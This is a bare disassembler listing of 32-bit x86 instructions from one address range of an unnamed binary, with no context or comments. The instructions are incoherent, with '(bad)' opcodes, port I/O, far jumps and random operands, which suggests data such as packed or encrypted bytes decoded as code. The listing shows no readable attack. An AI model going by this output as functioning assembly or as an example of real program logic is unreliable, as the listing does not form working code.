  4047cb:	out    dx,eax
  4047cc:	inc    esp
  4047cd:	in     eax,dx
  4047ce:	out    dx,al
  4047cf:	inc    ecx
  4047d0:	xor    DWORD PTR [ecx-0x20d3b599],edi
  4047d6:	jp     0x404802
  4047d8:	mov    edi,0xcd0b0530
  4047dd:	retf   0x245a
  4047e0:	or     DWORD PTR [esi+ebp*4],ecx
  4047e3:	imul   DWORD PTR [ebp+0x54]
  4047e6:	call   FWORD PTR [eax]
  4047e8:	mov    esi,0x38cb74ba
  4047ed:	aad    0xb2
  4047ef:	dec    esp
  4047f0:	mov    ah,0xa8
  4047f2:	pop    es
  4047f3:	inc    al
  4047f5:	fwait
  4047f6:	xor    esp,DWORD PTR [eax+0x5a]
  4047f9:	cmp    ch,cl
  4047fb:	or     BYTE PTR [ebx-0x47],ah
  4047fe:	inc    ebx
  4047ff:	jne    0x404819
  404801:	adc    al,0xc6
  404803:	js     0x4047c8
  404805:	adc    al,0xa8
  404807:	iret   
  404808:	jge    0x4047e8
  40480a:	sbb    edx,DWORD PTR [ecx-0x5f243cf4]
  404810:	dec    esp
  404811:	push   edx
  404812:	mov    ds:0x52413fcc,eax
  404817:	cwde   
  404818:	jbe    0x4047f9
  40481a:	jo     0x4047fb
  40481c:	jle    0x4047b1
  40481e:	(bad)
  404822:	jnp    0x404840
  404824:	test   BYTE PTR [ecx+0x4d],0x52
  404828:	ret    
  404829:	aad    0xce
  40482b:	add    BYTE PTR [edx],ch
  40482d:	popf   
  40482e:	test   BYTE PTR [esi+0x52],bh
  404831:	mov    eax,0xacb9905e
  404836:	cmp    esi,0xffffffcd
  404839:	push   edi
  40483a:	fwait
  40483b:	lds    eax,FWORD PTR [esi]
  40483d:	stc    
  40483e:	(bad)  
  40483f:	into   
  404840:	aas    
  404841:	popf   
  404842:	dec    BYTE PTR [edx-0x26]
  404845:	pushf  
  404846:	or     esp,eax
  404848:	int    0x78
  40484a:	outs   dx,DWORD PTR ds:[esi]
  40484b:	mov    ecx,0xf1aa039
  404850:	div    DWORD PTR [ecx+0x49]
  404853:	sbb    eax,0xbe6e0c7f
  404858:	cmp    bl,BYTE PTR [eax-0x1d]
  40485b:	mov    eax,DWORD PTR [ecx+0x6b]
  40485e:	leave  
  40485f:	pop    esp
  404860:	jb     0x404850
  404862:	push   ss
  404863:	aas    
  404864:	inc    eax
  404865:	ss fwait
  404867:	sar    DWORD PTR [ebx],cl
  404869:	inc    edx
  40486a:	scas   eax,DWORD PTR es:[edi]
  40486b:	jl     0x404825
  40486d:	fwait
  40486e:	cmp    bh,BYTE PTR [ebx]
  404870:	xor    BYTE PTR [edx-0x7],0x1b
  404874:	push   es
  404875:	dec    ebp
  404876:	imul   edi,DWORD PTR [eax+0x582a1c16],0x17
  40487d:	inc    esp
  40487e:	adc    dl,ah
  404880:	enter  0xdd07,0x50
  404884:	sbb    DWORD PTR [ecx-0x33],ecx
  404887:	sbb    eax,ebp
  404889:	mov    esi,0x980586fa
  40488e:	test   BYTE PTR ds:0x475feba,0x86
  404895:	or     DWORD PTR [edx+0x78],0x1dc4fb04
  40489c:	test   eax,0x61dd7057
  4048a1:	test   al,0x70
  4048a3:	cwde   
  4048a4:	stos   DWORD PTR es:[edi],eax
  4048a5:	mov    bl,0xd3
  4048a7:	dec    esi
  4048a8:	stos   DWORD PTR es:[edi],eax
  4048a9:	mov    edx,0xf28cda5a
  4048ae:	xchg   esp,eax
  4048af:	xchg   ecx,eax
  4048b0:	jne    0x404870
  4048b2:	push   esi
  4048b3:	retf   0xd418
  4048b6:	fldcw  WORD PTR [ecx-0x29]
  4048b9:	xlat   BYTE PTR ds:[ebx]
  4048ba:	cmp    BYTE PTR [esi-0x164f3c24],dl
  4048c0:	or     cx,di
  4048c3:	lods   eax,DWORD PTR ds:[esi]
  4048c4:	sub    DWORD PTR [esi+edx*1+0x54],eax
  4048c8:	push   cs
  4048c9:	mov    al,ds:0xb4a1a1a3
  4048ce:	lahf   
  4048cf:	mov    edx,0xa2f2ff6
  4048d4:	pandn  mm6,QWORD PTR [ebx]
  4048d7:	repnz mov edi,edi
  4048da:	dec    eax
  4048db:	mov    edi,0x6c173927
  4048e0:	or     esi,DWORD PTR [ecx+0x1f]
  4048e3:	shl    BYTE PTR [edi-0x5512b4fa],0xc9
  4048ea:	fstp   TBYTE PTR [eax+0x12623f5b]
  4048f0:	dec    esp
  4048f1:	jg     0x404891
  4048f3:	jge    0x4048e9
  4048f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048f6:	dec    eax
  4048f7:	retf   0x5bdd
  4048fa:	and    al,0x83
  4048fc:	sar    BYTE PTR [edi+0x73],1
  4048ff:	fsubrp st(3),st
  404901:	mov    bl,0x9a
  404903:	ret    0xcd9c
  404906:	xor    bl,dh
  404908:	jmp    0x4048b0
  40490a:	dec    edx
  40490b:	xor    ah,BYTE PTR [ebx]
  40490d:	retf   0x2ba0
  404910:	sub    BYTE PTR [ebx],ch
  404912:	in     eax,dx
  404913:	jmp    0x5b45:0xc19b5d23
  40491a:	mov    esi,0xec59b00
  40491f:	pop    ss
  404920:	adc    edi,DWORD PTR [ebx-0x6baca69f]
  404926:	cmp    al,0x1c
  404928:	inc    ebx
  404929:	and    DWORD PTR [ecx],edx
  40492b:	pop    ss
  40492c:	fld    QWORD PTR [ecx+0x66]
  40492f:	jmp    0x793e:0x425561c2
  404936:	fisub  WORD PTR [edi+0x357a18aa]
  40493c:	or     al,0x5
  40493e:	dec    ebx
  40493f:	mov    ebx,0x89dd336e
  404944:	adc    al,0x8d
  404946:	inc    ecx
  404947:	fsubr  QWORD PTR [ecx]
  404949:	loopne 0x4048e9
  40494b:	add    edx,DWORD PTR [edi+0x4c2b673c]
  404951:	pop    edi
  404952:	xchg   ecx,eax
  404953:	or     al,0x7e
  404955:	ror    DWORD PTR [edi],0xb9
  404958:	or     bl,BYTE PTR [esp+eax*8-0x4669824d]
  40495f:	lahf   
  404960:	xchg   ebp,eax
  404961:	mov    ds:0xd68dc520,al
  404966:	sub    BYTE PTR [ecx],ah
  404968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404969:	cmp    bl,BYTE PTR [eax]
  40496b:	cli    
  40496c:	inc    ebx
  40496d:	jne    0x404928
  40496f:	ins    BYTE PTR es:[edi],dx
  404970:	call   0x91b:0x45d3ca39
  404977:	int    0x48
  404979:	iret   
  40497a:	jmp    0x40498f
  40497c:	pop    ecx
  40497d:	outs   dx,DWORD PTR ds:[esi]
  40497e:	inc    esi
  40497f:	in     eax,0x6a
  404981:	adc    ch,BYTE PTR [edx]
  404983:	pop    edx
  404984:	outs   dx,BYTE PTR ds:[esi]
  404985:	mov    edx,DWORD PTR [ecx]
  404987:	pop    eax
  404988:	out    dx,al
  404989:	mov    al,ds:0x2b999813
  40498e:	push   ds
  40498f:	jb     0x4049e3
  404991:	and    DWORD PTR [esi-0x1338ada2],edx
  404997:	sbb    eax,edi
  404999:	test   al,0xb9
  40499b:	xor    al,0x6d
  40499d:	mov    edx,0x23768a7
  4049a2:	in     al,dx
  4049a3:	repnz loop 0x404997
  4049a6:	jmp    0x3438:0x184036db
  4049ad:	dec    esi
  4049ae:	mov    es,ebp
  4049b0:	mov    ecx,0x50d34d39
  4049b5:	jae    0x404a01
  4049b7:	adc    DWORD PTR [ecx+edi*8-0x7f],0x3a
  4049bc:	xchg   ecx,eax
  4049bd:	sub    BYTE PTR [eax-0x3f],ah
  4049c0:	add    ecx,DWORD PTR [ebx-0x13]
  4049c3:	mov    ebp,0xaf9a462c
  4049c8:	fcomi  st,st(0)
  4049ca:	jns    0x404a09
  4049cc:	xor    al,0xb4
  4049ce:	cmp    BYTE PTR [ecx+esi*2+0x32d40152],bl
  4049d5:	imul   esp,DWORD PTR [ecx],0x22
  4049d8:	repnz out dx,al
  4049da:	fdiv   DWORD PTR [esi]
  4049dc:	cld    
  4049dd:	data16 jae 0x4049e1
  4049e0:	adc    dl,BYTE PTR [eax-0x6d]
  4049e3:	out    0xaa,al
  4049e5:	jmp    0x64db38c1
  4049ea:	pop    edi
  4049eb:	aas    
  4049ec:	jne    0x404a66
  4049ee:	sub    eax,DWORD PTR [esp+edx*4+0x2c]
  4049f2:	(bad)  
  4049f3:	jno    0x404a5b
  4049f5:	sub    ah,dh
  4049f7:	shr    DWORD PTR [eax+0x52371b1],cl
  4049fd:	jmp    0x6fc70e0e
  404a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a03:	inc    esp
  404a04:	mov    bh,0xd3
  404a06:	inc    ecx
  404a07:	or     ebx,DWORD PTR [edi+0x37]
  404a0a:	jp     0x404a50
  404a0c:	pop    ecx
  404a0d:	out    0x4f,eax
  404a0f:	push   ebp
  404a10:	loopne 0x4049c2
  404a12:	fild   DWORD PTR [esi+0x23bfce3c]
  404a18:	es inc ecx
  404a1a:	mov    eax,0xa25b18a6
  404a1f:	inc    edi
  404a20:	daa    
  404a21:	sub    bh,BYTE PTR [edx+esi*2-0x2796cffa]
  404a28:	pop    ss
  404a29:	ffree  st(6)
  404a2b:	pop    es
  404a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a2d:	es in  al,0x8
  404a30:	mov    ebp,0xd087576e
  404a35:	xor    al,0x67
  404a37:	jbe    0x404a77
  404a39:	sbb    eax,0x384099ca
  404a3e:	pop    esi
  404a3f:	mov    dl,0xda
  404a41:	jnp    0x404a50
  404a43:	and    al,0xf2
  404a45:	icebp  
  404a46:	mov    al,0xbc
  404a48:	rcl    BYTE PTR [ecx-0x4a],0x62
  404a4c:	xchg   esi,eax
  404a4d:	xor    DWORD PTR [esi+0x5d],edi
  404a50:	dec    esp
  404a51:	ret    0x5a09
  404a54:	shl    BYTE PTR [ebx+eiz*4],cl
  404a57:	push   ss
  404a58:	test   eax,0x39c79525
  404a5d:	jp     0x404a3a
  404a5f:	xor    eax,0xe6c2f52b
  404a64:	ror    BYTE PTR [edx+edx*8+0x10],cl
  404a68:	sti    
  404a69:	or     eax,DWORD PTR [esi+ebp*4+0x2]
  404a6d:	ret    
  404a6e:	xchg   ebx,eax
  404a6f:	in     al,0x15
  404a71:	imul   edx,esi,0x3f
  404a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a75:	push   eax
  404a76:	push   ss
  404a77:	adc    BYTE PTR [ebp+0x65],dl
  404a7a:	jl     0x404af6
  404a7c:	inc    ecx
  404a7d:	(bad)  
  404a7f:	leave  
  404a80:	mov    esp,0x480671d9
  404a85:	scas   al,BYTE PTR es:[edi]
  404a86:	rcr    ecx,cl
  404a88:	popa   
  404a89:	pop    ecx
  404a8a:	and    eax,0xf62fe29d
  404a8f:	cdq    
  404a90:	pop    ds
  404a91:	jb     0x404a62
  404a93:	(bad)  
  404a94:	or     al,0x83
  404a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a97:	jnp    0x404a7f
  404a99:	out    0x3,eax
  404a9b:	dec    edi
  404a9c:	xchg   ebx,eax
  404a9d:	pop    ecx
  404a9e:	(bad)  
  404a9f:	mov    dl,0x50
  404aa1:	jae    0x404ae2
  404aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404aa4:	ins    DWORD PTR es:[edi],dx
  404aa5:	add    eax,DWORD PTR [ebx]
  404aa7:	mov    ah,0x5f
  404aa9:	fmul   st(7),st
  404aab:	or     eax,0xd9ed44a7
  404ab0:	push   esp
  404ab1:	scas   eax,DWORD PTR es:[edi]
  404ab2:	pop    ebp
  404ab3:	daa    
  404ab4:	sbb    DWORD PTR ds:0x7d2c3a77,0x37
  404abb:	xchg   ecx,eax
  404abc:	and    al,BYTE PTR [eax]
  404abe:	pop    ss
  404abf:	outs   dx,DWORD PTR ds:[esi]
  404ac0:	mov    edx,0x19937eab
  404ac5:	std    
  404ac6:	sub    DWORD PTR [ebx-0x28470c4f],ebx
  404acc:	sub    eax,0x42d6d8a5
  404ad1:	aam    0xaf
  404ad3:	xchg   edx,eax
  404ad4:	retf   0xd3a8
  404ad7:	std    
  404ad8:	fsub   QWORD PTR [ebx+ebx*8-0x78]
  404adc:	jmp    0x404b5d
  404ade:	pushw  es
  404ae0:	out    dx,eax
  404ae1:	xor    ch,ah
  404ae3:	add    al,0x30
  404ae5:	(bad)  
  404ae6:	nop
  404ae7:	cmp    BYTE PTR [edx],dl
  404ae9:	jl     0x404b3e
  404aeb:	mov    bh,0x64
  404aed:	mov    al,0x6e
  404aef:	push   es
  404af0:	fisttp WORD PTR [edi-0x5d]
  404af3:	sbb    eax,0xe44aaa40
  404af8:	and    BYTE PTR [ebx+edx*1+0x1f],bh
  404afc:	push   ebp
  404afd:	in     al,0xec
  404aff:	mov    edx,0x16f9b96f
  404b04:	pmaxsw mm4,mm0
  404b07:	test   bl,cl
  404b09:	push   es
  404b0a:	fldlg2 
  404b0c:	mov    ebx,?
  404b0e:	inc    ebx
  404b0f:	cld    
  404b10:	out    0x61,al
  404b12:	sub    eax,0x11a3afe8
  404b17:	rcl    BYTE PTR [eax],cl
  404b19:	and    eax,0x101818f8
  404b1e:	pop    es
  404b1f:	mov    WORD PTR [ecx+eax*2+0x4d],cs
  404b23:	hlt    
  404b24:	adc    ecx,0x12
  404b27:	cmc    
  404b28:	mov    ds:0xb2abaea3,eax
  404b2d:	jno    0x404b6b
  404b2f:	jg     0x404ba2
  404b31:	pushf  
  404b32:	sahf   
  404b33:	iret   
  404b34:	cli    
  404b35:	ret    0xdb32
  404b38:	mov    esp,0x1b334f8f
  404b3d:	jo     0x404b74
  404b3f:	pop    ecx
  404b40:	inc    ebp
  404b41:	in     al,0xee
  404b43:	pop    esi
  404b44:	jg     0xbff1f4d0
  404b4a:	loopne 0x404b07
  404b4c:	mov    eax,0xcaf52e49
  404b51:	push   ds
  404b52:	and    ebp,edi
  404b54:	cmp    BYTE PTR [esi-0x26578f75],0x6e
  404b5b:	sahf   
  404b5c:	in     al,dx
  404b5d:	lds    esi,FWORD PTR [eax+ebx*4-0x32]
  404b61:	rcr    DWORD PTR [edx],0x11
  404b64:	dec    esp
  404b65:	mov    DWORD PTR [ecx-0x38806b4a],0x6ba922e5
  404b6f:	mov    ds:0xf484d008,eax
  404b74:	sub    DWORD PTR [esi],ebp
  404b76:	aaa    
  404b77:	jb     0x404afc
  404b79:	(bad)  
  404b7a:	sub    ebx,DWORD PTR [ebp+eiz*1-0x68f7bc18]
  404b81:	and    DWORD PTR [esi],esp
  404b83:	xchg   ecx,eax
  404b84:	or     BYTE PTR [ecx+0x60cac209],bl
  404b8a:	(bad)  
  404b8b:	jne    0x404bf2
  404b8d:	push   eax
  404b8e:	retf   
  404b8f:	and    ch,dh
  404b91:	sbb    BYTE PTR [ebx],ah
  404b93:	dec    ebp
  404b94:	ret    0xc1fd
  404b97:	cmc    
  404b98:	sbb    ah,BYTE PTR [edi]
  404b9a:	add    eax,0x788489b8
  404b9f:	nop
  404ba0:	jae    0x404bef
  404ba2:	pop    edi
  404ba3:	stc    
  404ba4:	add    bh,bl
  404ba6:	mov    ebx,0x8fd14ac5
  404bab:	addr16 or al,0x92
  404bae:	into   
  404baf:	mov    dh,0xc0
  404bb1:	and    al,0xc0
  404bb3:	fwait
  404bb4:	ret    
  404bb5:	xchg   ebx,eax
  404bb6:	mov    ss,WORD PTR [edi]
  404bb8:	lods   al,BYTE PTR ds:[esi]
  404bb9:	outs   dx,DWORD PTR ds:[esi]
  404bba:	stc    
  404bbb:	mov    WORD PTR [ebp+0xebbc3e9],?
  404bc1:	gs (bad) 
  404bc3:	je     0x404bbc
  404bc5:	fs jmp 0xc204aaf3
  404bcb:	push   ebp
  404bcc:	mov    al,0x12
  404bce:	mov    esp,0x6a6fa39c
  404bd3:	sub    bl,BYTE PTR [eax+ebp*4]
  404bd6:	and    eax,DWORD PTR [ecx+0x1b]
  404bd9:	cmp    ebp,DWORD PTR ds:0xb3b65f70
  404bdf:	add    ecx,DWORD PTR [ebp+0x2f6dc10e]
  404be5:	jecxz  0x404c3c
  404be7:	enter  0xb27d,0xfc
  404beb:	push   ss
  404bec:	out    0x10,eax
  404bee:	test   al,0x56
  404bf0:	aad    0xa2
  404bf2:	cdq    
  404bf3:	adc    edi,DWORD PTR [esi+0x4e]
  404bf6:	xchg   esi,eax
  404bf7:	adc    esp,DWORD PTR [ebp+0xfa22fb7]
  404bfd:	ficomp DWORD PTR [ecx-0x294a34d6]
  404c03:	jl     0x404bd6
  404c05:	cli    
  404c06:	dec    ebp
  404c07:	jle    0x404bf2
  404c09:	out    dx,al
  404c0a:	loop   0x404c14
  404c0c:	shl    esi,1
  404c0e:	sub    ebp,esi
  404c10:	in     al,0x60
  404c12:	pop    edx
  404c13:	add    DWORD PTR [edx-0x7b],ebx
  404c16:	gs je  0x404c77
  404c19:	mov    edi,0x6df36bb2
  404c1e:	add    DWORD PTR [eax+ecx*1],0xffffffd5
  404c22:	xchg   BYTE PTR [eax+0x432218b7],ch
  404c28:	cld    
  404c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2a:	rol    BYTE PTR [esi-0x3a1a8155],0x47
  404c31:	lahf   
  404c32:	push   eax
  404c33:	cli    
  404c34:	xor    bh,BYTE PTR [ebx+0x722096fa]
  404c3a:	(bad)  
  404c3b:	push   esp
  404c3c:	addr16 out dx,eax
  404c3e:	cmp    dh,BYTE PTR [edx-0x476e010b]
  404c44:	cmp    ch,BYTE PTR [edx-0x2d4dabd1]
  404c4a:	and    eax,0xb50f4e30
  404c4f:	jmp    0x90032ff1
  404c54:	div    BYTE PTR [esi+eiz*4+0x4b]
  404c58:	mov    BYTE PTR [esi-0x31744294],0x65
  404c5f:	inc    eax
  404c60:	gs pop ebp
  404c62:	iret   
  404c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c64:	cld    
  404c65:	mov    dl,0xa0
  404c67:	sti    
  404c68:	data16 scas al,BYTE PTR es:[edi]
  404c6a:	xchg   esp,eax
  404c6b:	sbb    DWORD PTR [ebx-0x3f],esp
  404c6e:	ins    BYTE PTR es:[edi],dx
  404c6f:	out    0x61,al
  404c71:	out    dx,al
  404c72:	pop    edi
  404c73:	cld    
  404c74:	jae    0x404c93
  404c76:	xor    al,0xc5
  404c78:	test   BYTE PTR [esi-0x3c],ch
  404c7b:	aas    
  404c7c:	or     esi,0xea10ca5b
  404c82:	mov    eax,ds:0x34524f7d
  404c87:	mov    cl,0x9f
  404c89:	jbe    0x404c7b
  404c8b:	ret    
  404c8c:	xchg   BYTE PTR [edi],ch
  404c8e:	test   DWORD PTR [esi+0x3d],edi
  404c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c92:	out    dx,al
  404c93:	loopne 0x404ca9
  404c95:	hlt    
  404c96:	mov    edi,0x34975ba9
  404c9b:	bswap  edi
  404c9d:	aaa    
  404c9e:	out    0xbe,eax
  404ca0:	rol    esp,0x3c
  404ca3:	sar    DWORD PTR [edx+ebx*1],1
  404ca6:	out    dx,eax
  404ca7:	sub    al,0x5
  404ca9:	mov    dh,0x51
  404cab:	jae    0x404c98
  404cad:	fwait
  404cae:	xlat   BYTE PTR ds:[ebx]
  404caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cb0:	int3   
  404cb1:	mov    ebp,0x2949239b
  404cb6:	mov    cl,BYTE PTR [esi-0x39bf0021]
  404cbc:	call   0x8cde:0xf8e61b42
  404cc3:	mov    ebx,0x9ae453c3
  404cc8:	push   esp
  404cc9:	jg     0x404d12
  404ccb:	pop    edi
  404ccc:	mov    ch,0x71
  404cce:	es loopne 0x404cc6
  404cd1:	mov    gs,WORD PTR [ecx-0x61]
  404cd4:	sbb    esp,ecx
  404cd6:	push   ds
  404cd7:	jmp    0x611f:0xbfe89208
  404cde:	jae    0x404cac
  404ce0:	adc    eax,0xc4982dcf
  404ce5:	btc    DWORD PTR [edi+0x2b0ee233],edx
  404cec:	push   edi
  404ced:	jmp    0xac36:0x993d0f0a
  404cf4:	jae    0x404d74
  404cf6:	das    
  404cf7:	imul   BYTE PTR [eax-0xa1a75d1]
  404cfd:	dec    esp
  404cfe:	lock adc dh,bl
  404d01:	adc    eax,0x24f58e03
  404d06:	inc    esi
  404d07:	jbe    0x404cc3
  404d09:	inc    DWORD PTR ss:[eax-0x28]
  404d0d:	adc    ecx,DWORD PTR [ebx-0x18588ebd]
  404d13:	or     eax,0x46fd78a4
  404d18:	aam    0xb8
  404d1a:	daa    
  404d1b:	pushf  
  404d1c:	es xor esp,eax
  404d1f:	sub    BYTE PTR [ebp-0x60cbe34b],al
  404d25:	mov    esi,0x7d9239e0
  404d2a:	mov    ch,0x8d
  404d2c:	pop    eax
  404d2d:	and    al,al
  404d2f:	dec    eax
  404d30:	pop    esi
  404d31:	lock arpl cx,bx
  404d34:	push   ebp
  404d35:	shl    BYTE PTR [eax],0xa3
  404d38:	jmp    0x404ce4
  404d3a:	dec    ecx
  404d3b:	fcomp  QWORD PTR [ebp+ecx*1+0x47]
  404d3f:	out    dx,al
  404d40:	stos   DWORD PTR es:[edi],eax
  404d41:	ret    0x6e5a
  404d44:	test   al,0x93
  404d46:	mov    al,0x29
  404d48:	scas   al,BYTE PTR es:[edi]
  404d49:	sahf   
  404d4a:	(bad)  
  404d4b:	imul   esi,DWORD PTR [edx+ecx*8+0x4e],0xa7d76eb4
  404d53:	jae    0x404d60
  404d55:	fist   WORD PTR [eax+0x4d2cd782]
  404d5b:	dec    esi
  404d5c:	sbb    dl,0x7f
  404d5f:	ja     0x404cec
  404d61:	int    0xce
  404d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d64:	jmp    0xfce276df
  404d69:	das    
  404d6a:	pop    ecx
  404d6b:	in     eax,dx
  404d6c:	fistp  QWORD PTR [edi]
  404d6e:	jg     0x404dd0
  404d70:	fsub   QWORD PTR [ebp-0x358fb85b]
  404d76:	call   0xf332b979
  404d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7c:	aad    0x8
  404d7e:	dec    ecx
  404d7f:	add    al,0xe8
  404d81:	sahf   
  404d82:	jmp    0x404dd7
  404d84:	sub    dl,BYTE PTR [ebx-0x6edc21b4]
  404d8a:	mov    DWORD PTR [edx],ecx
  404d8c:	in     eax,0xb2
  404d8e:	icebp  
  404d8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d91:	ror    esp,0x3b
  404d94:	pop    es
  404d95:	ret    0x1ca3
  404d98:	and    al,0x12
  404d9a:	aam    0xe2
  404d9c:	xchg   esi,eax
  404d9d:	mov    esp,0x1964a216
  404da2:	lods   al,BYTE PTR ds:[esi]
  404da3:	popa   
  404da4:	inc    ecx
  404da5:	dec    edx
  404da6:	or     BYTE PTR [ebx],bl
  404da8:	add    BYTE PTR [ebx],cl
  404daa:	cmp    bl,BYTE PTR [eax]
  404dac:	std    
  404dad:	xor    BYTE PTR [ebp-0x50f51367],al
  404db3:	jle    0x404e34
  404db5:	pop    ecx
  404db6:	xchg   edx,eax
  404db7:	jb     0x404d73
  404db9:	stos   BYTE PTR es:[edi],al
  404dba:	xor    BYTE PTR [ebp-0x3e],0x44
  404dbe:	fidiv  WORD PTR [edx]
  404dc0:	cmp    DWORD PTR [eax+0xb],ebx
  404dc3:	es test eax,0x39a89f97
  404dc9:	inc    eax
  404dca:	test   esi,0x24fa15ec
  404dd0:	push   ebx
  404dd1:	out    dx,eax
  404dd2:	cmp    esp,DWORD PTR [ebx]
  404dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd5:	pop    es
  404dd6:	xor    ecx,edx
  404dd8:	scas   al,BYTE PTR es:[edi]
  404dd9:	stc    
  404dda:	les    edi,FWORD PTR [ebp+0x33]
  404ddd:	mov    bl,0x43
  404ddf:	cmp    eax,0xf277dac0
  404de4:	dec    ebx
  404de5:	fild   DWORD PTR [ebx-0x687ac344]
  404deb:	gs mov cl,0x73
  404dee:	enter  0x47b3,0xb5
  404df2:	leave  
  404df3:	add    ecx,ebp
  404df5:	outs   dx,DWORD PTR ds:[esi]
  404df6:	call   0x8b5a:0x119250d3
  404dfd:	mov    eax,0x6739100
  404e02:	cli    
  404e03:	jno    0x404e22
  404e05:	mov    ds,WORD PTR [ecx+0x145ff9f]
  404e0b:	sar    BYTE PTR [eax-0x57954a33],cl
  404e11:	hlt    
  404e12:	or     al,0xa1
  404e14:	jae    0x404e18
  404e16:	adc    dl,al
  404e18:	gs adc edx,edi
  404e1b:	sbb    al,0xcb
  404e1d:	shl    edi,1
  404e1f:	and    ch,bl
  404e21:	jmp    0x8cf7:0xb95cbc20
  404e28:	iret   
  404e29:	inc    eax
  404e2a:	xor    DWORD PTR [eax-0x73],ebx
  404e2d:	scas   al,BYTE PTR es:[edi]
  404e2e:	stos   DWORD PTR es:[edi],eax
  404e2f:	daa    
  404e30:	dec    ebp
  404e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e32:	(bad)  
  404e33:	jo     0x404e6d
  404e35:	mov    ?,WORD PTR [eax+0x285b595d]
  404e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e3c:	shl    BYTE PTR [esi-0x51],1
  404e3f:	cmp    dl,al
  404e41:	bound  esi,QWORD PTR [ebp-0x291ba25f]
  404e47:	lock stos DWORD PTR es:[edi],eax
  404e49:	mov    ds:0x6f990a7b,eax
  404e4e:	mov    esp,0xa4087ff8
  404e53:	into   
  404e54:	add    eax,0x28a31dd0
  404e59:	out    0xf5,al
  404e5b:	push   ebp
  404e5c:	sub    DWORD PTR [eax+0x40],edi
  404e5f:	sub    eax,0xa3c6d03f
  404e64:	imul   ecx,DWORD PTR [edx],0x4ad770e8
  404e6a:	loopne 0x404e3a
  404e6c:	ds jnp 0x404e88
  404e6f:	scas   al,BYTE PTR es:[edi]
  404e70:	cmp    ah,BYTE PTR [ecx+ecx*4]
  404e73:	xchg   ebp,esi
  404e75:	inc    edx
  404e76:	sub    bl,BYTE PTR [edi+eiz*4]
  404e79:	pop    DWORD PTR [edi]
  404e7b:	sti    
  404e7c:	mov    ds:0xed7a25e9,eax
  404e81:	and    ecx,DWORD PTR [edx-0x5224110f]
  404e87:	jecxz  0x404e9c
  404e89:	repz and cl,cl
  404e8c:	scas   al,BYTE PTR es:[edi]
  404e8d:	std    
  404e8e:	mov    gs,WORD PTR ds:0xcdc40793
  404e94:	xchg   DWORD PTR [ebp-0x4a],edx
  404e97:	pop    ebp
  404e98:	push   cs
  404e99:	scas   al,BYTE PTR es:[edi]
  404e9a:	push   ebx
  404e9b:	xchg   edi,eax
  404e9c:	sub    esi,DWORD PTR [esi-0x1c]
  404e9f:	mov    WORD PTR [ecx],ss
  404ea1:	jo     0x404e7a
  404ea3:	sub    bl,dl
  404ea5:	pop    es
  404ea6:	stos   DWORD PTR es:[edi],eax
  404ea7:	dec    esi
  404ea8:	ins    DWORD PTR es:[edi],dx
  404ea9:	jmp    0x7883:0x53912039
  404eb0:	frstor [esi-0x762e75a2]
  404eb6:	push   ds
  404eb7:	push   ebp
  404eb8:	and    esi,DWORD PTR [edi+0x5f]
  404ebb:	and    eax,0x601008b7
  404ec0:	sbb    ebp,esi
  404ec2:	jns    0x404ea2
  404ec4:	and    bh,BYTE PTR [eax+0x63d6f1a7]
  404eca:	inc    BYTE PTR [ecx]
  404ecc:	dec    esp
  404ecd:	xor    eax,0x1d797f32
  404ed2:	push   eax
  404ed3:	push   esp
  404ed4:	rcr    esi,0x43
  404ed7:	iret   
  404ed8:	int3   
  404ed9:	fstp   DWORD PTR [edx]
  404edb:	je     0x404ee4
  404edd:	stos   BYTE PTR es:[edi],al
  404ede:	rcr    DWORD PTR [esi+0x27caed4d],0x25
  404ee5:	fisttp DWORD PTR [edi-0x11]
  404ee8:	(bad)  [ecx]
  404eea:	add    al,0xf6
  404eec:	add    dl,ah
  404eee:	(bad)  [ebp+0x44]
  404ef1:	and    al,0x8f
  404ef3:	leave  
  404ef4:	pop    ebp
  404ef5:	mov    ds:0x860f05a1,eax
  404efa:	sub    al,BYTE PTR [edx]
  404efc:	aad    0xbc
  404efe:	mul    dl
  404f00:	popf   
  404f01:	dec    ebx
  404f02:	imul   BYTE PTR [esi-0x7a36890b]
  404f08:	jg     0x404ee3
  404f0a:	fs push esp
  404f0c:	mov    al,ds:0x8b83301a
  404f11:	(bad)  
  404f12:	in     eax,dx
  404f13:	gs mov ch,0x84
  404f16:	mov    ds:0xe2a198dc,al
  404f1b:	sbb    BYTE PTR [eax+0x7f7c2b24],bl
  404f21:	cmp    eax,0xa44daaa5
  404f26:	lds    esp,FWORD PTR [esi-0x1b]
  404f29:	fs das 
  404f2b:	loope  0x404f0a
  404f2d:	push   es
  404f2e:	das    
  404f2f:	test   BYTE PTR [eax+0x69],ah
  404f32:	in     eax,dx
  404f33:	mov    ecx,0x97b22fe1
  404f38:	mov    dh,BYTE PTR [eax-0xe4e80c7]
  404f3e:	pop    ds
  404f3f:	sbb    eax,0x8d4e1fa7
  404f44:	mov    ds:0x7db277bc,al
  404f49:	lds    edi,FWORD PTR [ecx-0x6ab1dafe]
  404f4f:	popf   
  404f50:	xchg   ecx,eax
  404f51:	add    al,0xaa
  404f53:	sbb    DWORD PTR [eax+0x70c17389],esp
  404f59:	mov    ebx,0x8885e496
  404f5e:	xor    al,0xed
  404f60:	and    dh,al
  404f62:	fwait
  404f63:	dec    edi
  404f64:	xchg   ebx,eax
  404f65:	push   ss
  404f66:	xor    ah,cl
  404f68:	(bad)  
  404f69:	pop    edx
  404f6a:	push   0x69fe31c2
  404f6f:	jle    0x404fee
